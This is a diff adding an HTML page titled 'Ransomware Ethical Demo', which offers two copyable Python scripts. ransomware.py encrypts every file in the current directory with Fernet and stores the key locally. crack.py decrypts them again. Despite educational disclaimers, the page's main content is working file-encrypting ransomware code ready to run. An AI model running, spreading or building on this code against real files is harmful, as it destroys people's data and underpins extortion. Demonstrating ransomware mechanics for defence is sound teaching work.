@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ransomware</title>
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+
+    <style>
+        :root {
+            --primary-text: #1a1a1a;
+            --secondary-text: #444444;
+            --accent: #333333;
+            --light-bg: #f8f8f8;
+            --dark-bg: #0d0d0d;
+            --code-bg: #f0f0f0;
+            --border: #cccccc;
+            --highlight: #000000;
+            --shadow: rgba(0, 0, 0, 0.1);
+        }
+
+        body {
+            font-family: 'Share Tech Mono', monospace;
+            background-color: var(--light-bg);
+            color: var(--primary-text);
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            line-height: 1.6;
+            background-image: 
+                radial-gradient(circle at 10% 20%, rgba(0,0,0,0.02) 0%, transparent 20%),
+                radial-gradient(circle at 90% 80%, rgba(0,0,0,0.02) 0%, transparent 20%);
+        }
+
+        h1, h2 {
+            color: var(--accent);
+            text-shadow: 0 0 5px rgba(0, 0, 0, 0.1);
+            border-bottom: 1px solid var(--border);
+            padding-bottom: 5px;
+            font-weight: 600;
+        }
+        
+        h1 {
+            text-align: center;
+            font-size: 2.5em;
+            margin-top: 0;
+            letter-spacing: 1px;
+        }
+
+        h2 {
+            font-size: 1.5em;
+            margin-top: 30px;
+            padding-top: 10px;
+        }
+
+        p {
+            color: var(--secondary-text);
+            line-height: 1.8;
+        }
+
+        .code-container {
+            position: relative;
+            background: var(--code-bg);
+            border-radius: 8px;
+            margin: 20px 0;
+            border: 1px solid var(--border);
+            box-shadow: 0 4px 12px var(--shadow);
+            overflow: hidden;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .code-container:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 16px var(--shadow);
+        }
+
+        /* Styling for the <pre> and <code> from Highlight.js */
+        .code-container pre {
+            margin: 0;
+            padding: 15px;
+            padding-top: 40px;
+            background: var(--code-bg);
+            overflow-x: auto;
+        }
+        
+        .code-container pre code.hljs {
+            background: var(--code-bg);
+            border-radius: 8px;
+            padding: 0;
+        }
+
+        .copy-btn {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: var(--accent);
+            color: white;
+            border: none;
+            padding: 5px 10px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-family: 'Share Tech Mono', monospace;
+            font-weight: bold;
+            transition: all 0.2s ease;
+            text-shadow: none;
+            border: 1px solid var(--border);
+        }
+
+        .copy-btn:hover {
+            background: var(--highlight);
+            box-shadow: 0 0 8px rgba(0, 0, 0, 0.2);
+        }
+        
+        .copy-btn:active {
+            transform: scale(0.95);
+        }
+
+        .download-link {
+            display: inline-block;
+            margin: 20px 0;
+            padding: 12px 24px;
+            background: var(--accent);
+            color: white;
+            text-decoration: none;
+            border-radius: 4px;
+            font-weight: bold;
+            transition: all 0.2s ease;
+            text-shadow: none;
+            border: 1px solid var(--border);
+            box-shadow: 0 4px 6px var(--shadow);
+        }
+
+        .download-link:hover {
+            background: var(--highlight);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 10px var(--shadow);
+        }
+
+        .disclaimer {
+            background: #f9f9f9;
+            border: 1px solid #e0e0e0;
+            color: #555;
+            padding: 15px;
+            border-radius: 4px;
+            margin: 20px 0;
+            border-left: 4px solid #333;
+            box-shadow: 0 2px 8px var(--shadow);
+        }
+        
+        .disclaimer strong {
+            color: #333;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid var(--border);
+        }
+        
+        .header p {
+            font-size: 1.1em;
+            color: var(--secondary-text);
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px solid var(--border);
+            color: var(--secondary-text);
+            font-size: 0.9em;
+        }
+        
+        .code-header {
+            background: var(--accent);
+            color: white;
+            padding: 8px 15px;
+            font-size: 0.9em;
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            border-bottom: 1px solid var(--border);
+        }
+        
+        .code-header span {
+            color: #aaa;
+        }
+        
+        .warning {
+            background: #fff8f0;
+            border: 1px solid #ffe0c2;
+            color: #d46b08;
+            padding: 12px 15px;
+            border-radius: 4px;
+            margin: 20px 0;
+            border-left: 4px solid #fa8c16;
+        }
+        
+        .warning strong {
+            color: #d46b08;
+        }
+        
+        .key-point {
+            background: #f0f2f5;
+            padding: 15px;
+            border-radius: 4px;
+            margin: 20px 0;
+            border-left: 4px solid #1890ff;
+        }
+        
+        .key-point h3 {
+            margin-top: 0;
+            color: #1890ff;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <h1>Ransomware Ethical Demo</h1>
+        <p>Understanding ransomware mechanisms for educational and defensive purposes</p>
+    </div>
+
+    <div class="warning">
+        <strong>Important:</strong> This demonstration is for educational purposes only. Do not run these scripts on production systems or personal files.
+    </div>
+
+    <p>Ransomware is a type of malicious software designed to encrypt or lock a victim's files, rendering them inaccessible until a ransom is paid, typically in cryptocurrency, to receive the decryption key. It spreads through phishing emails, malicious downloads, or vulnerabilities in software, posing significant risks to individuals and organizations by causing data loss, financial damage, and operational disruption.</p>
+    
+    <div class="key-point">
+        <h3>Educational Focus</h3>
+        <p>This demo illustrates the fundamental concepts of encryption-based attacks to help security professionals understand and defend against such threats.</p>
+    </div>
+
+    <h2>ransomware.py</h2>
+    <div class="code-container">
+        <div class="code-header">Python <span>- Ransomware</span></div>
+        <button class="copy-btn" onclick="copyCode('ransom-code')">Copy</button>
+        <pre><code id="ransom-code" class="language-python">#For ransomware.py - Ethical demo only
+# Do not run in production environments
+
+import os
+from cryptography.fernet import Fernet
+
+# Collect files safely
+files = []
+for file in os.listdir():
+    if file in ["ransomware.py", "secret.key","crack.py"]:
+        continue
+    if os.path.isfile(file):
+        files.append(file)
+
+print("Files to encrypt:", files)
+
+# Generate and save key
+key = Fernet.generate_key()
+with open("secret.key", "wb") as key_file:
+    key_file.write(key)
+
+fernet = Fernet(key)
+
+# Encrypt files
+for file in files:
+    with open(file, "rb") as f:
+        data = f.read()
+    encrypted = fernet.encrypt(data)
+    with open(file, "wb") as f:
+        f.write(encrypted)
+
+print("Encryption complete. Keep secret.key safe!")
+</code></pre>
+    </div>
+
+    <h2>crack.py</h2>
+    <div class="code-container">
+        <div class="code-header">Python <span>- Decryption</span></div>
+        <button class="copy-btn" onclick="copyCode('crack-code')">Copy</button>
+        <pre><code id="crack-code" class="language-python">
+# For decryption key recovery
+
+import os
+from cryptography.fernet import Fernet
+
+with open("secret.key", "rb") as key_file:
+    key = key_file.read()
+
+fernet = Fernet(key)
+
+files = []
+for file in os.listdir():
+    if file in ["ransomware.py", "secret.key", "crack.py"]:
+        continue
+    if os.path.isfile(file):
+        files.append(file)
+
+print("Files to decrypt:", files)
+
+for file in files:
+    with open(file, "rb") as f:
+        data = f.read()
+    decrypted = fernet.decrypt(data)
+    with open(file, "wb") as f:
+        f.write(decrypted)
+
+print("Decryption complete.")
+
+</code></pre>
+    </div>
+
+    <a href="test.zip" download class="download-link">Download Test Files</a>
+
+    <div class="footer">
+        <p>Educational Security Demonstration | Created by Gaurav Dhaka </p>
+        <p></p>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    
+    <script>
+        
+        function copyCode(id) {
+            const codeElement = document.getElementById(id);
+            const text = codeElement.innerText;
+            navigator.clipboard.writeText(text).then(() => {
+                const button = event.target;
+                const originalText = button.innerText;
+                button.innerText = 'Copied!';
+                setTimeout(() => {
+                    button.innerText = originalText;
+                }, 2000);
+            }).catch(err => {
+                console.error('Failed to copy: ', err);
+            });
+        }
+        
+       
+        hljs.highlightAll();
+    </script>
+
+</body>
+</html>
